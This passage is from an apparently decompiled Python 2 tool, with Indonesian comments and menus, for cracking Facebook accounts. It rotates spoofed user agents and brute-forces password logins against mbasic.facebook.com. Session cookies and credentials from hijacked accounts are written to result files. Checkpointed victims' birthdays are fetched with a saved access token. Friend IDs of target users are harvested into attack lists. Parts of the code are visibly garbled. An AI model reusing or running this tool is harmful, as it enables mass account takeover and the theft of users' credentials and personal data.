                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4501.0 Safari/537.36 Edg/91.0.866.0',
                'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Mobile Safari/537.36 Edg/90.0.818.46',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 KHTML, like Gecko) Chrome/80.0.3987.122 Mobile Safari/537.',
                'Mozilla/5.0 (Linux; Android 8.0.0; Nokia 3.1 Build/O00623) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 3S Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.85 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
                'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/127.0.0.22.69;]',
                'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/12.9.10.1166 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30',
                'Mozilla/5.0 (Linux; Android 10; SM-T295 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/330.0.0.31.120;]',
                'Mozilla/5.0 (Linux; Android 11; SM-A715F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.164 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/330.0.0.31.120;]',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148[FBAN/MessengerForiOS;FBDV/iPhone10,3;FBMD/iPhone;FBSN/iOS;FBSV/12.2;FBSS/3;FBCR/Tele2;FBID/phone;FBLC/ru_RU;FBOP/5]',
                'Mozilla/5.0 (Linux; Android 5.0; Lenovo A1000 Build/S100; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36[FB_IAB/MESSENGER;FBAV/110.0.0.14.69;]',
                'Mozilla/5.0 (Linux; Android 7.0; Infinix HOT 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36[FB_IAB/MESSENGER;FBAV/114.0.0.21.71;]',
                'Mozilla/5.0 (Linux; Android 11.0.1; HUAWEI P30) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36',
                'Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM; Touch; Huawei; H883G; HuaweiH883G)',
                'Mozilla/5.0 (Linux; Android 11.0.1; HUAWEI P30 Lite) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.77 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/229.0.0.35.117;]',
                'Mozilla/5.0 (Linux; Android 7.0; TRT-L21A Build/HUAWEITRT-L21A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 7.0; TRT-L21A Build/HUAWEITRT-L21A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/229.0.0.35.117;]',
                'Mozilla/5.0 (Linux; Android 9; RMX2030) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 9; RMX2030) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
                'Mozilla/5.0 (Linux; Android 10; Realme 5 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.29 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 4.4.4; SM-G530H Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 CoolBrowser/33.0.0.0 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; U; Android 4.4.1; ru-RU; SM-S920L Build/KOT49E) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 UCBrowser/9.9.2.467 U3/0.8.0 Mobile Safari/E7FBAF',
                'Mozilla/5.0 (Linux; Android 5.1.1; SM-G531H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.115 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-G530F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Max Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36 UCBrowser/11.5.2.1188 (UCMini) Mobile',
                'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36',
                'Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54',
                'Mozilla/5.0 (Linux; Android 4.4.4; G7-L01 Build/HuaweiG7-L01) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36[FB_IAB/MESSENGER;FBAV/121.0.0.15.70;]',
                'Mozilla/5.0 (Linux; Android 9; LT-NOTE 10S Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.115 Mobile Safari/537.36 UCBrowser/11.4.1.1138 (UCMini) Mobile',
                'Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.159 CoRom/33.0.1750.159 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/E7FBAF',
                'Mozilla/5.0 (Linux; Android 9; Star) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002;\xc2\xa0wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]',
                'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+',
                'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]',
                'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]',
                'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]',
                'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]',
                'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]',
                'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]',
                'Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.159 CoRom/33.0.1750.159 Safari/537.36 Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54',
                'Mozilla/5.0 (Linux; Android 9; Mi Note 10 Build/PKQ1.190302.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
                'Mozilla/5.0 (Series40; NokiaC2-02/07.48; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45',
                'Mozilla/5.0 (Series40; NokiaC2-02/07.65; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27',
                'Mozilla/5.0 (Linux; Android 7.0; SM-A310F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36 OPR/42.7.2246.114996',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) OPiOS/10.2.0.93022 Mobile/11D257 Safari/9537.53',
                'Mozilla/5.0 (Linux; U; Android 7.0; en-US; SM-G935F Build/NRD90M) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.8.976 U3/0.8.0 Mobile Safari/534.30',
                'Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 6.0; Lenovo K50a40 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.137 YaBrowser/17.4.1.352.00 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; U; Android 7.0; en-us; MI 5 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/9.0',
                'Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.14977',
                'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+',
                'Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone  OS 7.5; Trident/5.0; IEMobile/9.0',
                'Mozilla/5.0 (Linux; U; Android 4.2; ru-ru; Nokia_X Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.2 Mobile Safari/E7FBAF',
                'Mozilla/5.0 (Linux; Android 4.2; Nokia_X Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/E7FBAF',
                'Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 Nokia5800d-1/60.0.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4',
                'Mozilla/5.0 (Symbian/3; Series60/5.3 NokiaC6-01/111.040.1511; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/535.1',
                'Nokia5800/20.0.002 (SymbianOS/9.4; U; Series60/5.0 Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
                'Mozilla/5.0 (Linux; Android 10; CDY-NX9A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 9; Huawei P20 Lite Build/PQ3A.190801.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.158 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 9; EVR-L29 Build/HUAWEIEVR-L29; xx-xx) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 9; LYA-AL00 Build/HUAWEILYA-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 8.1; EML-L29 Build/HUAWEIEML-L29; xx-xx) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 8.1; CLT-L29 Build/HUAWEICLT-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 9; ELE-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 9; VOG-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36'])
            headers_ = {
                'Host': 'mbasic.facebook.com',
                'upgrade-insecure-requests': '1',
                'user-agent': asu,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'dnt': '1',
                'x-requested-with': 'mark.via.gp',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-user': 'empty',
                'sec-fetch-dest': 'document',
                'referer': 'https://mbasic.facebook.com/',
                'accept-encoding': 'gzip, deflate br',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8' }
            p = ses.get('https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers = headers_).text
            dataa = {
                'lsd': re.search('name="lsd" value="(.*?)"', str(p)).group(1),
                'jazoest': re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
                'uid': user,
                'flow': 'login_no_pin',
                'pass': pw,
                'next': 'https://developers.facebook.com/tools/debug/accesstoken/' }
            _headers = {
                'Host': 'mbasic.facebook.com',
                'cache-control': 'max-age=0',
                'upgrade-insecure-requests': '1',
                'origin': 'https://mbasic.facebook.com',
                'content-type': 'application/x-www-form-urlencoded',
                'user-agent': 'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G981U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.2 Chrome/92.0.4515.166 Mobile Safari/537.36',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'x-requested-with': 'mark.via.gp',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-user': 'empty',
                'sec-fetch-dest': 'document',
                'referer': 'https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F',
                'accept-encoding': 'gzip, deflate br',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8' }
            po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0', data = dataa, headers = _headers, allow_redirects = False)
            if 'c_user' in ses.cookies.get_dict():
                kukis = ';'.join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r %s[LIVE] %s|%s        ' % (H, user, pw)
                print ' %s[COOKIE] %s  ' % (H, kukis)
                ok.append('%s|%s|%s' % (user, pw, kukis))
                open('hasil/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' *--> %s|%s|%s\n' % (user, pw, kukis))
                cek_apk(kukis)
                break
                continue
            elif 'checkpoint' in ses.cookies.get_dict():
                
                try:
                    romz = open('token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s' % (user, romz)).json()['birthday']
                    (month, day, year) = lahir.split('/')
                    month = bulan1[month]
                    print '\r %s[CHECK] %s \xe2\x97\x8a %s \xe2\x97\x8a %s %s %s ' % (K, user, pw, day, month, year)
                    cp.append('%s \xe2\x97\x8a %s \xe2\x97\x8a %s %s %s' % (user, pw, day, month, year))
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' *--> %s \xe2\x97\x8a %s \xe2\x97\x8a %s %s %s\n' % (user, pw, day, month, year))
                except KeyError:
                    day = ''
                    month = ''
                    year = ''
                except:
                    pass

                print '\r %s[CHECK] %s \xe2\x97\x8a %s            ' % (K, user, pw)
                cp.append('%s \xe2\x97\x8a %s' % (user, pw))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' *--> %s \xe2\x97\x8a %s\n' % (user, pw))
                break
                continue
        
        loop += 1
        rm = random.choice([
            '\x1b[1;91m',
            '\x1b[1;92m',
            '\x1b[1;93m',
            '\x1b[1;94m',
            '\x1b[1;95m',
            '\x1b[1;96m',
            '\x1b[1;97m'])
        for wk in list('\\|-/'):
            (sys.stdout.write('\r' + wk + wk + ' [' + user + '] %s/%s %s%s%s[OK-CP][%s-%s] ' % (len(self.id), loop, warna, warna, warna, len(ok), len(cp))),)
        
        sys.stdout.flush()



def cek_apk(kukis):
    session = requests.Session()
    w = session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=active', cookies = {
        'cookie': 'noscript=1;' + kukis }).text
    sop = bs4.BeautifulSoup(w, 'html.parser')
    x = sop.find('form', method = 'post')
    print '\r\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90 INFORMASI GAME : '
    game = [ i.text for i in x.find_all('h3') ]
    
    try:
        for i in range(len(game)):
            print '\r       \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90%s[%s]> %s%s' % (P, i + 1, H, game[i].replace('Ditambahkan pada', ' Ditambahkan pada'))
    except AttributeError:
        print '\r      %s\xe2\x80\xa2 cookie invalid' % M

    w = session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive', cookies = {
        'cookie': 'noscript=1;' + kukis }).text
    sop = bs4.BeautifulSoup(w, 'html.parser')
    x = sop.find('form', method = 'post')
    game = [ i.text for i in x.find_all('h3') ]
    
    try:
        for i in range(len(game)):
            print '\r       \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90%s[%s]> %s%s' % (P, i + 1, K, game[i].replace('Kedaluwarsa', ' Kedaluwarsa'))
    except AttributeError:
        print '\r      %s\xe2\x80\xa2 cookie invalid' % M

    print '\r      \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90[TIDAK ADA APLIKASI]>' % M


def menu():
    os.system('clear')
    
    try:
        romz = open('token.txt', 'r').read()
    except IOError:
        print '%s [!] Token invalid ' % M
        jeda(2)
        os.system('rm -rf token.txt')
        masuk()

    
    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + romz, headers = header)
        a = json.loads(r.text)
        nama = a['name']
    except KeyError:
        print '%s [!] Token invalid ' % M
        jeda(2)
        os.system('rm -rf data/token.txt && rm -rf data/cookies')
        masuk()
    except requests.exceptions.ConnectionError:
        exit('%s [!] Kesalahan koneksi ' % M)

    banner()
    print ' %s[ Hello %s%s%s Selamat%s ] \n' % (P, K, nama, P, so)
    print ' [%s01%s] Dump id public' % (K, P)
    print ' [%s02%s] Dump id old' % (K, P)
    print ' [%s03%s] Start Crack' % (K, P)
    print ' [%s04%s] Cek hasil crack' % (K, P)
    print ' [%s05%s] Donasi Ke Authour ' % (K, P)
    print ' [%s00%s] Hapus token ' % (M, P)
    unik = raw_input('\n%s [?] Menu : %s' % (P, K))
    if unik == '':
        print '%s [!] Isi yang benar kentod ' % M
        jeda(2)
        menu()
    elif unik in ('1', '01'):
        publik(romz)
    elif unik in ('2', '02'):
        dump_old()
    elif unik in ('3', '03'):
        ngentod().romiy()
    elif unik in ('4', '04'):
        hasill()
    elif unik in ('5', '05'):
        donasi()
    elif unik in ('0', '00'):
        print ''
        os.system('rm -rf token.txt')
        jalan('\n%s [\xe2\x88\x9a] berhasil terhapus ' % H)
        exit()
    else:
        print '%s [!] Isi yang benar kentod ' % M
        jeda(2)
        menu()


def donasi():
    jalan(' [\xe2\x80\xa2] INI Hanya Untuk Yang Mau Donasi ')
    jalan(' [\xe2\x80\xa2] Kalau Mau Nanya Nanya Di Facebook Aja')
    jalan(' [\xe2\x80\xa2] NO Authour Jika Ingin Mendonasi')
    jalan(' [\xe2\x80\xa2] -------------------------------------------')
    jalan(' [\xe2\x80\xa2] \xf0\x9f\x91\x89DICKY WAHYUDI\xf0\x9f\x91\x88 \n [\xe2\x80\xa2] \xf0\x9f\x91\x89 +6289670952904 \xf0\x9f\x91\x88')
    jalan(' [\xe2\x80\xa2] -------------------------------------------')
    targetdw()
    exit()


def text_random():
    contol = uuid.uuid4().hex[:10].upper()
    return contol

war = '[\xe2\x80\xa2]'

def dump_old():
    
    try:
        token = open('token.txt', 'r').read()
    except IOError:
        jalan(war + 'Token Failed')
        time.sleep(2)
        time.sleep(0.5)

    
    try:
        nada = int(raw_input('\n' + war + ' Dump Berapa ID? : '))
        if nada > 10:
            jalan(war + ' Minimal 10 ID')
            time.sleep(0.5)
            dump_old()
    except ValueError:
        jalan(war + ' Pilihan Invalid')
        time.sleep(0.5)
        dump_old()

    print '[\xe2\x80\xa2] Kasih Nama File Dump Contoh Dicky \n[\xe2\x80\xa2] Atau Enter Untuk Otomatis'
    namax = raw_input(war + ' Nama File : ')
    if namax == '' or namax == ' ':
        namax = text_random()
    lonsg = open('dump/' + namax + '.json', 'w')
    for dot in range(nada):
        dot += 1
        tampung = []
        non_old = []
        uid = raw_input(war + ' Masukkan ID Target Ke %s : ' % dot)
        
        try:
            asu = requests.get('https://graph.facebook.com/' + uid + '?access_token=' + token)
            tulul = json.loads(asu.text)
            print war + ' Nama :' + tulul['name']
        except KeyError:
            print war + 'Kemungkinan Idz Ini Tidak DiPublickan'
            time.sleep(0.5)
            exit()
        except requests.exceptions.ConnectionError:
            jalan(war + 'Tidak Ada Internet')
            time.sleep(0.5)
            exit()

        
        try:
            bulu = requests.get('https://graph.facebook.com/%s?fields=name,friends.fields(id,name).limit(5000)&access_token=%s' % (uid, token)).json()
            for cew in bulu['friends']['data']:
                
                try:
                    jamet = cew['id']
                    junet = cew['name']
                    non_old.append(jamet + '|' + junet)
                    detec = jamet + '<=>' + junet
                    if detec in id:
                        continue
                    elif len(jamet) == 6 and len(jamet) == 7 or len(jamet) == 8:
                        id.append(jamet + '<=>' + junet)
                        tampung.append(jamet + '<=>' + junet)
                        well = open('dump/' + namax + '.json', 'a')
                        well.write(jamet + '<=>' + junet + '\n')
                        well.close()
                    elif len(jamet) == 9:
                        id.append(jamet + '<=>' + junet)
                        tampung.append(jamet + '<=>' + junet)
                        well = open('dump/' + namax + '.json', 'a')
                        well.write(jamet + '<=>' + junet + '\n')
                        well.close()
                    elif len(jamet) == 10 and jamet[0] == '1':
                        if jamet[1] == '0' or jamet[1] == '1':
                            if jamet[2] == '0' and jamet[2] == '1' or jamet[2] == '2':
                                id.append(jamet + '<=>' + junet)
                                tampung.append(jamet + '<=>' + junet)
                                well = open('dump/' + namax + '.json', 'a')
                                well.write(jamet + '<=>' + junet + '\n')
                                well.close()
                            else:
                                continue
                        else:
                            continue
                    else:
                        
                        try:
                            (jame, jamet) = jamet.split('0000')
                            jamet = '10000' + jamet
                            id.append(jamet + '<=>' + junet)
                            tampung.append(jamet + '<=>' + junet)
                            well = open('dump/' + namax + '.json', 'a')
                            well.write(jamet + '<=>' + junet + '\n')
                            well.close()
                        except:
                            pass

                continue
                continue
                continue

            
            print war + ' Jumlah Akun Old : %s\n' % len(tampung)
        continue
        except requests.exceptions.ConnectionError:
            jalan(war + ' Tidak Ada Internet')
            time.sleep(0.5)
            exit()
            continue
            print war + ' ID ' + C + uid + Q + ' Tidak Publik'
            time.sleep(2)
            dump_old()
            continue
        

    
    id_ = '%s' % len(id)
    if id_ == '0' or '0' == id_:
        jalan(war + '  Pertemanan Akun 0 silahkan Cari Target Lain !!')
    else:
        print war + ' Total ID : %s' % len(id)
        print war + ' Nama Hasil Dump : ' + I + 'dump/' + namax + '.json' + Q
        exit()


def targetdw():
    print ' [!] Wait'
    time.sleep(3)
    raw_input(' [\xe2\x80\xa2] Enter ')
    os.system('am start https://wa.me/+6289670952904?text=Assalamualaikum,+Bang+Dicky,+Saya+Ingin+Donasi+%20>/dev/null')
    exit(' [\xe2\x80\xa2] Selamat Tinggal')


def targetra():
    print ' [!] Wait'
    time.sleep(3)
    raw_input(' [\xe2\x80\xa2] Enter ')
    os.system('am start https://wa.me/+6282371648186?text=Assalamualaikum,+Bang+Romi,+Saya+Ingin+Donasi+%20>/dev/null')
    exit(' [\xe2\x80\xa2] Selamat Tinggal')


def folder():
    
    try:
        os.mkdir('hasil')
    except:
        pass

    
    try:
        os.mkdir('data')
    except:
        pass

    
    try:
        ua_ = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
        open('data/ua.txt', 'w').write(ua_)
    except:
        pass



def hasill():
    
    try:
        dirs = os.listdir('hasil')
        print ''
        for file in dirs:
            print '%s -> %s%s' % (K, P, file)
            jeda(0.2)
        
        print '\n %s[%s!%s] cth : CP-%s-%s-%s%s' % (P, M, P, ha, op, ta, '.txt')
        file = raw_input('%s [?] masukan file : ' % P)
        jeda(0.2)
        if file == '':
            print '%s [!] file tidak ada ' % M
        total = open('hasil/%s' % file).read().splitlines()
        print ' %s[%s*%s] --------------------------------------' % (P, K, P)
        jeda(2)
        nm_file = ('%s' % file).replace('-', ' ')
        jalan(' [%s*%s] total akun : %s' % (K, P, len(total)))
        print ' %s[%s*%s] --------------------------------------' % (P, K, P)
        jeda(2)
        for akun in total:
            fb = akun.replace('\n', '')
            tling = fb.replace(' *--> ', ' *-->').replace(' *-->', ' *--> ')
            print tling
            jeda(0.03)
        
        print ' %s[%s*%s] --------------------------------------' % (P, K, P)
        jeda(2)
        raw_input('\n%s [ %senter %s] ' % (P, K, P))
        menu()
    except IOError:
        print '\n%s [!] tidak ada hasil ' % M
        raw_input('\n%s [ %senter %s] ' % (P, K, P))
        menu()

    exit()

if __name__ == '__main__':
    os.system('git pull')
    print ' * Make Doank Donasi Kagak \xf0\x9f\x98\x91'
    time.sleep(3)
    print ' * Waterboom Men'
    time.sleep(3)
    folder()
    silet()
    apa()
    menu()
